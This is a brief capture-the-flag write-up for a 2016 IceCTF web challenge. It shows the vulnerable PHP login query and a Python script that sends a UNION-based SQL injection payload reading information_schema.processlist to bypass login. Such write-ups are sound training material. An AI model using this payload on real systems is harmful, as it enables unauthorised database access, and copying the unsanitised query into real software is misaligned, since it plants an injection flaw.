============================================================================================================
[2016_IceCTF] [WEB] Solve
============================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="post_data: {username=' union select 1,2,info from information_schema.processlist-- -}",arrowhead="normal"];
        step3 -> step2[label="login success",arrowhead="normal"];
    }

|

server -> DB
================================================================================================================

- PHP 
- POST 파라미터: username, password

.. code-block:: sql

    SELECT * FROM users WHERE 
    username='$_POST["username"]' AND 
    password='$_POST["password"]'

|

union select 
================================================================================================================

- information_schema.processlist

.. code-block:: python

    import requests

    requests.packages.urllib3.disable_warnings()

    url = "http://miners.vuln.icec.tf/login.php"

    payload = {
        "username": "' union select 1,2,info from information_schema.processlist-- -",
        "password": "1",
    }

    r = requests.post(url, data=payload, verify=False)

    print r.content

|
